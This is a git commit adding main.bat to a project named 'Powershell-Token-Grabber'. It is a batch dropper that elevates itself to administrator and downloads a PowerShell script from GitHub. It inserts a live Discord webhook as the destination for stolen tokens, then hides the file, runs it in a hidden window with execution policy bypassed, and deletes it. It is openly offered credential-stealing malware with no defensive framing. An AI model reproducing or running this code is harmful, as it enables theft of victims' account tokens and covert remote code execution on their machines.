c4a3c2acf797387ab6f99418124024ba316d8c84
yhhhhchrs <160278257+cvrush@users.noreply.github.com>
2024-04-16 18:32:38 +0000

    Add files via upload

---
+++ Powershell-Token-Grabber-f7356b8d2c298bbcd907bc4f658c4daa78438488/main.bat
@@ -0,0 +1,14 @@
+@echo off
+
+net session >nul 2>&1
+if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
+cd /d %~dp0
+
+powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1227814115385544704/E67A14s3dPMV45KDKde52VJl1PIVUprkpLXPY-oqqE8sxynNEfNm9XiYYsyiOQ3qR2z1' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
+attrib +h +s powershell123.ps1
+powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
+powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
+attrib -h -s powershell123.ps1
+del powershell123.ps1 /f /q
+timeout 3 > nul
+exit
